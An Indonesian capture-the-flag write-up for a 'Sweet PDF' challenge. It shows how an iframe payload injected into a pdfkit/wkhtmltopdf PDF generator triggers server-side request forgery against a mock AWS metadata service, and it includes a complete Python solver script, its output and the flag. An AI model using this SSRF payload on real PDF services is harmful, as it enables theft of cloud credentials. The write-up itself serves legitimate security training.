# WriteUp - Sweet PDF

## Overview

* **Judul:** Sweet PDF
* **Kategori:** Request Manipulation
* **Poin:** 25
* **Deskripsi:** Saat melakukan recon, saya nemu resource menarique pada port 9000. Bisa akses `http://<host>:9000/latest/meta-data/iam/security-credentials/admin`?
* **URL:** `http://localhost:1337`
* **Author:** -

## Attachment & Struktur Direktori

Berikut adalah informasi file dan struktur direktori yang berjalan di dalam container server:

```bash
▶  docker exec sweetpdf-web-1 ls -la
total 24
drwxr-xr-x 1 root root 4096 Feb 15 05:38 .
drwxr-xr-x 1 root root 4096 Feb 15 05:38 ..
drwxr-xr-x 2 root root 4096 Feb 15 05:38 __pycache__
-rw-r--r-- 1 root root 3789 Feb 13 06:41 app.py
-rw-r--r-- 1 root root 1716 Feb 13 06:41 imds.py
-rw-r--r-- 1 root root    2 Feb 15 05:38 supervisord.pid

```

## Reconnaissance

Analisis dilakukan terhadap dua file utama yang menjalankan layanan web pada container, yaitu `app.py` dan `imds.py`.

### Analisis app.py

Aplikasi utama berjalan menggunakan Flask pada port `8080` (di-mapping ke `1337` di host). Aplikasi ini berfungsi sebagai generator dokumen PDF. Input HTML dari user via parameter `content` akan digabungkan ke dalam kerangka HTML utuh, lalu dirender menjadi PDF menggunakan fungsi `pdfkit.from_string()`.

```python
@app.route('/generate', methods=['POST'])
def generate():
    title = request.form.get('title', 'Untitled')
    content = request.form.get('content', '')
    
    # ... HTML wrapper ...
    
    try:
        pdfkit.from_string(full_html, filename, options=options)
        return send_file(filename, as_attachment=True, download_name='report.pdf')

```

### Analisis imds.py

Terdapat sebuah skrip tiruan Instance Metadata Service (IMDS) AWS yang berjalan secara lokal di port `9000`. Layanan ini di-bind secara eksklusif ke `127.0.0.1`, sehingga tidak dapat diakses langsung dari luar container. Jika sebuah request HTTP dikirim ke endpoint `/latest/meta-data/iam/security-credentials/admin`, server IMDS lokal ini akan merespons dengan JSON yang berisi variabel `FLAG`.

```python
METADATA_PATH = "/latest/meta-data/iam/security-credentials/admin"
# ...
            response = {
                "Code": "Success",
                "LastUpdated": "2023-01-01T00:00:00Z",
                "Type": "AWS-HMAC",
                "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
                "SecretAccessKey": FLAG,
                "Token": "token",
                "Expiration": "2026-01-01T00:00:00Z"
            }

```

## Vulnerability Analysis

Tantangan ini mengharuskan kita mengeksploitasi celah **Server-Side Request Forgery (SSRF)**.
Library `pdfkit` (yang menggunakan mesin `wkhtmltopdf` di belakang layar) bertugas me-render tag HTML yang diberikan oleh pengguna. Apabila pengguna menyuntikkan tag HTML yang memerlukan pengambilan resource eksternal (seperti `<iframe>`, `<img>`, `<link>`), `pdfkit` akan membuat request HTTP dari sisi server untuk memuat resource tersebut dan merendernya ke dalam PDF.

Karena PDF engine berjalan di server yang sama dengan layanan IMDS palsu, kita dapat menyuruh `pdfkit` untuk mengakses `http://127.0.0.1:9000` dan mencetak hasil response (yang berisi flag) ke dalam file PDF yang akan kita unduh.

## Exploitation

Proses eksploitasi dilakukan dengan menyuntikkan payload HTML berupa elemen `iframe` yang mengarah ke endpoint lokal dari layanan IMDS:

```html
<iframe src="http://127.0.0.1:9000/latest/meta-data/iam/security-credentials/admin" width="100%" height="800"></iframe>

```

Saat server memproses permintaan ini, halaman PDF akan menampung hasil eksekusi dari URL tersebut.

### Script Solver (`exploit.py`)

Skrip berikut secara otomatis mengirimkan payload SSRF dan menyimpan file PDF hasilnya.

```python
import requests
import re
import os

TARGET_URL = "http://localhost:1337/generate"
OUTPUT_PDF = "flag_report.pdf"

def exploit():
    print("[*] Preparing SSRF Payload via Iframe...")
    
    ssrf_payload = '<iframe src="http://127.0.0.1:9000/latest/meta-data/iam/security-credentials/admin" width="100%" height="800"></iframe>'
    
    data = {
        "title": "AWS IMDS Dump",
        "content": ssrf_payload
    }
    
    print("[*] Sending malicious request to PDF generator...")
    
    try:
        response = requests.post(TARGET_URL, data=data)
        
        if response.status_code == 200 and 'application/pdf' in response.headers.get('Content-Type', ''):
            print(f"[+] Success! Received PDF file. Saving to {OUTPUT_PDF}...")
            
            with open(OUTPUT_PDF, 'wb') as f:
                f.write(response.content)
                
            print(f"\n[*] Boom! Buka file '{OUTPUT_PDF}' pake PDF viewer lu bro.")
            print("[*] Flagnya ada di dalem teks JSON di PDF itu.")
        else:
            print("[-] Gagal dapet PDF. Cek respon server:")
            print(response.text[:200])
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Error connecting to target: {e}")

if __name__ == "__main__":
    exploit()

```

### Output Terminal Eksekusi Exploit

```bash
▶  ./exploit.py
[*] Preparing SSRF Payload via Iframe...
[*] Sending malicious request to PDF generator...
[+] Success! Received PDF file. Saving to flag_report.pdf...

[*] Boom! Buka file 'flag_report.pdf' pake PDF viewer lu bro.
[*] Flagnya ada di dalem teks JSON di PDF itu.

▶  file flag_report.pdf
flag_report.pdf: PDF document, version 1.4, 1 page(s)

```

Setelah file `flag_report.pdf` berhasil diunduh, utilitas `pdftotext` digunakan untuk mencetak langsung isi (teks JSON dari IMDS) yang telah berhasil di-render oleh PDF engine ke standard output terminal.

```bash
▶  pdftotext flag_report.pdf -
AWS IMDS Dump

{"Code": "Success", "LastUpdated": "2023-01-01T00:00:00Z", "Type": "AWS-HMAC", "AccessKeyId":
"ASIAIOSFODNN7EXAMPLE", "SecretAccessKey": "pwn{faab6617c02056744255ebdd406b8eac}", "Token": "token",
"Expiration": "2026-01-01T00:00:00Z"}

```

## Flag

```
pwn{faab6617c02056744255ebdd406b8eac}

```
